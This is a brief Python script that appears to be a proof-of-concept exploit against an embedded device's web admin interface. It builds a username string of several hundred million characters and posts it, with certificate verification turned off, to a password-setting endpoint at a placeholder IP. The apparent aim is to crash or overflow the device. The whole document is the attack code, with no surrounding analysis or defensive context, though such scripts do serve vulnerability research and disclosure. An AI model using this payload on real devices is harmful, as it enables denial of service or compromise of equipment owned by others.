import requests
import json

long_string = "hello_world"

for i in range(25):
	long_string += long_string

print(len(long_string))

data = json.dumps({"INPUTT_USERNAME":long_string, "access": "https", "INPUTT_PASSWORD": "", "INPUTT_DUMMY": ""})

r = requests.post("https://<ip>/PRESENTATION/ADVANCED/PASSWORD/SET", data=data, verify=False)
